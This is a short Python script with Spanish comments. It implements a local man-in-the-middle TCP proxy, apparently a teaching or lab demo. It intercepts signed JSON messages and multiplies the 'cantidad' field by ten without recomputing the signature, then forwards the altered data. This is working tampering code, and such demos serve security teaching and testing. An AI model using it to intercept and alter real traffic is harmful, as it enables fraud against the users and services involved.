# -- coding: utf-8 --
import socket
import threading
import json
import argparse

BUFFER = 4096

def handle_one_direction(src_sock, dst_sock, modify_from_client=False):
    """Reenvía datos src -> dst. Si modify_from_client True, intenta modificar 'cantidad'."""
    try:
        while True:
            data = src_sock.recv(BUFFER)
            if not data:
                # Cierre de la conexión en origen
                try:
                    dst_sock.shutdown(socket.SHUT_WR)
                except Exception:
                    pass
                break

            if modify_from_client:
                # Intentar detectar y modificar un JSON firmado
                try:
                    text = data.decode()
                    if text.strip().startswith("{") and '"firma"' in text:
                        obj = json.loads(text)
                        if isinstance(obj, dict) and "datos" in obj and isinstance(obj["datos"], dict):
                            datos = obj["datos"]
                            if "cantidad" in datos:
                                original = datos["cantidad"]
                                # Intentamos convertir a entero; si no, lo marcamos
                                try:
                                    num = int(original)
                                    nuevo = num * 10
                                    datos["cantidad"] = str(nuevo) if isinstance(original, str) else nuevo
                                except Exception:
                                    datos["cantidad"] = f"{original}_MOD"
                                # No volvemos a calcular la firma: la dejamos tal cual
                                new_text = json.dumps(obj, sort_keys=True)
                                print(f"[MITM] Modificado campo 'cantidad': {original} -> {datos['cantidad']}")
                                data = new_text.encode()
                except Exception:
                    # Si no es JSON válido o hay fallo, lo reenviamos tal cual
                    pass

            dst_sock.sendall(data)
    except Exception as e:
        # Silencioso en la demo; el servidor/cliente puede cerrar sockets y provocar excepciones.
        pass

def handle_connection(client_sock, client_addr, server_host, server_port):
    print(f"[MITM] Cliente conectado desde {client_addr}. Conectando al servidor real {server_host}:{server_port}...")
    try:
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((server_host, server_port))
    except Exception as e:
        print(f"[MITM] No se pudo conectar al servidor real: {e}")
        client_sock.close()
        return

    # Hilos: cliente->servidor (con modificación), servidor->cliente (sin modificación)
    t1 = threading.Thread(target=handle_one_direction, args=(client_sock, server_sock, True), daemon=True)
    t2 = threading.Thread(target=handle_one_direction, args=(server_sock, client_sock, False), daemon=True)
    t1.start()
    t2.start()

    t1.join()
    t2.join()

    try:
        client_sock.close()
    except:
        pass
    try:
        server_sock.close()
    except:
        pass
    print(f"[MITM] Conexión con {client_addr} finalizada.")

def start_proxy(listen_host, listen_port, server_host, server_port):
    print(f"[MITM] Iniciando proxy en {listen_host}:{listen_port} -> servidor real {server_host}:{server_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((listen_host, listen_port))
        s.listen(5)
        while True:
            client_sock, client_addr = s.accept()
            threading.Thread(target=handle_connection, args=(client_sock, client_addr, server_host, server_port), daemon=True).start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Proxy MITM simple para pruebas")
    parser.add_argument("--listen-host", default="127.0.0.1", help="Host donde escucha el proxy")
    parser.add_argument("--listen-port", type=int, default=3031, help="Puerto donde escucha el proxy")
    parser.add_argument("--server-host", default="127.0.0.1", help="Host del servidor real")
    parser.add_argument("--server-port", type=int, default=3030, help="Puerto del servidor real")
    args = parser.parse_args()

    try:
        start_proxy(args.listen_host, args.listen_port, args.server_host, args.server_port)
    except KeyboardInterrupt:
        print("\n[MITM] Proxy detenido por usuario.")
